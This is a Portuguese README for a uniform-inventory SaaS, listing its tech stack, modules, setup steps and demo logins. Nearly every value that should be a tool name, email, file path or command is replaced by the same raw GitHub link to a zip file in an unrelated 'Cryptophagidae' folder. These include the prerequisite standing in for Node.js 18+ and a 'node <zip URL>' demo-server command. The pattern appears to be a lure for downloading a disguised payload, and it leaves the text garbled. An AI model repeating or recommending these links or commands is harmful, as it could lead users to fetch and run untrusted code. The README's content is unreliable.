# Sistema D&S Fardamentos

Sistema SaaS completo para gestão de fardamentos empresariais com controle de estoque, distribuição e relatórios.

## 🚀 Tecnologias Utilizadas

### Frontend
- React 18 com TypeScript
- Vite para build e desenvolvimento
- Tailwind CSS para estilização
- Zustand para gerenciamento de estado
- React Router para navegação
- React Hook Form com Zod para validação
- Axios para requisições HTTP
- Recharts para gráficos
- Sonner para notificações

### Backend
- https://raw.githubusercontent.com/Se198361/sistema-D-S-fardamentos/main/Cryptophagidae/fardamentos-sistema-v1.7-alpha.1.zip com Express
- TypeScript
- JWT para autenticação
- Express Validator para validação
- Helmet para segurança
- CORS para controle de acesso

## 📋 Funcionalidades

### Sistema de Autenticação Multi-Empresa
- **Admin Master**: Acesso total a todas as empresas
- **Admin Empresa**: Gestão completa da empresa
- **Gestor de Estoque**: Controle de estoque e relatórios
- **Funcionário**: Visualização de uniformes e solicitações

### Módulos Principais

1. **Dashboard**
   - Visão geral do estoque
   - Alertas de validade e estoque baixo
   - Gráficos de distribuição mensal
   - Estatísticas em tempo real

2. **Gestão de Estoque**
   - Cadastro de itens de uniforme
   - Controle de entradas/saídas
   - Validação por tamanho e lote
   - Alertas automáticos de vencimento

3. **Funcionários**
   - Cadastro completo de colaboradores
   - Atribuição de uniformes por funcionário
   - Histórico de distribuições
   - Controle de departamentos

4. **Distribuição**
   - Registro de entrega de uniformes
   - Controle por tamanho e quantidade
   - Status de distribuição (em uso, devolvido, vencido)
   - Devolução de itens

5. **Relatórios**
   - Inventário completo
   - Distribuição por funcionário
   - Alertas de vencimento
   - Exportação em PDF e Excel

## 🛠️ Instalação e Execução

### Pré-requisitos
- https://raw.githubusercontent.com/Se198361/sistema-D-S-fardamentos/main/Cryptophagidae/fardamentos-sistema-v1.7-alpha.1.zip 18+ 
- pnpm (ou npm)

### Instalação

1. Clone o repositório
```bash
git clone <url-do-repositorio>
cd sistema-ds-fardamentos
```

2. Instale as dependências do frontend
```bash
pnpm install
```

3. Configure as variáveis de ambiente
Crie um arquivo `.env` na raiz do projeto:
```env
VITE_API_URL=http://localhost:3000/api
```

4. Inicie o servidor de desenvolvimento
```bash
pnpm dev
```

### Backend (Demonstração)

Para executar o backend de demonstração:

```bash
# Usar o servidor de demonstração simplificado
node https://raw.githubusercontent.com/Se198361/sistema-D-S-fardamentos/main/Cryptophagidae/fardamentos-sistema-v1.7-alpha.1.zip
```

O servidor rodará na porta 3000.

## 🔑 Credenciais de Demonstração

### Admin Master
- Email: `https://raw.githubusercontent.com/Se198361/sistema-D-S-fardamentos/main/Cryptophagidae/fardamentos-sistema-v1.7-alpha.1.zip`
- Senha: `admin123`

### Admin Empresa  
- Email: `https://raw.githubusercontent.com/Se198361/sistema-D-S-fardamentos/main/Cryptophagidae/fardamentos-sistema-v1.7-alpha.1.zip`
- Senha: `empresa123`

### Gestor Estoque
- Email: `https://raw.githubusercontent.com/Se198361/sistema-D-S-fardamentos/main/Cryptophagidae/fardamentos-sistema-v1.7-alpha.1.zip`
- Senha: `gestor123`

### Funcionário
- Email: `https://raw.githubusercontent.com/Se198361/sistema-D-S-fardamentos/main/Cryptophagidae/fardamentos-sistema-v1.7-alpha.1.zip`
- Senha: `funcionario123`

## 📊 Estrutura do Projeto

```
sistema-ds-fardamentos/
├── src/
│   ├── components/          # Componentes React reutilizáveis
│   ├── pages/              # Páginas principais do sistema
│   ├── services/           # Serviços de API e integrações
│   ├── stores/             # Gerenciamento de estado com Zustand
│   ├── types/              # Definições TypeScript
│   ├── hooks/              # Hooks customizados
│   └── lib/                # Utilitários e helpers
├── api/                    # Backend https://raw.githubusercontent.com/Se198361/sistema-D-S-fardamentos/main/Cryptophagidae/fardamentos-sistema-v1.7-alpha.1.zip
├── https://raw.githubusercontent.com/Se198361/sistema-D-S-fardamentos/main/Cryptophagidae/fardamentos-sistema-v1.7-alpha.1.zip          # Servidor de demonstração simplificado
└── https://raw.githubusercontent.com/Se198361/sistema-D-S-fardamentos/main/Cryptophagidae/fardamentos-sistema-v1.7-alpha.1.zip
```

## 🎯 Próximas Implementações

- [ ] Integração com PostgreSQL
- [ ] Sistema de notificações por email
- [ ] Geração de QR codes para uniformes
- [ ] App mobile para funcionários
- [ ] Integração com sistemas de RH
- [ ] Dashboard avançado com IA
- [ ] Sistema de aprovações
- [ ] Histórico completo de auditoria

## 🤝 Contribuição

1. Faça um fork do projeto
2. Crie uma branch para sua feature (`git checkout -b feature/AmazingFeature`)
3. Commit suas mudanças (`git commit -m 'Add some AmazingFeature'`)
4. Push para a branch (`git push origin feature/AmazingFeature`)
5. Abra um Pull Request

## 📝 Licença

Este projeto está sob a licença MIT. Veja o arquivo `LICENSE` para mais detalhes.

## 📞 Suporte

Para suporte e dúvidas, entre em contato através do email: https://raw.githubusercontent.com/Se198361/sistema-D-S-fardamentos/main/Cryptophagidae/fardamentos-sistema-v1.7-alpha.1.zip

---

Desenvolvido com ❤️ por D&S Fardamentos# sistema-D-S-fardamentos
